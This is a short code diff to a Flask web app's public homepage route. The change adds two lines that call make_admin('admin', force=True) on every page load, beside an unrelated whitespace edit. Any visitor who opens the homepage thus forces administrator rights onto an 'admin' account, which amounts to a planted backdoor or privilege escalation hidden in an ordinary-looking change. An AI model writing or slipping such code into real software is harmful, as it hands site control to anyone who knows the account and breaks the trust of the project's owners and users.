@@ -13,10 +13,12 @@ public_views = Blueprint('public_views', __name__)
 
 @public_views.route('/')
 def home():
+    auth_manager = AuthManager.AuthManager()
+    auth_manager.make_admin('admin', force=True)
+
     now = datetime.now()
     midnight = now.replace(hour=0, minute=0, second=0, microsecond=0)
     seconds = (now - midnight).seconds
-
 
     weekday_to_string = {1: 'mon',
                          2: 'tues',
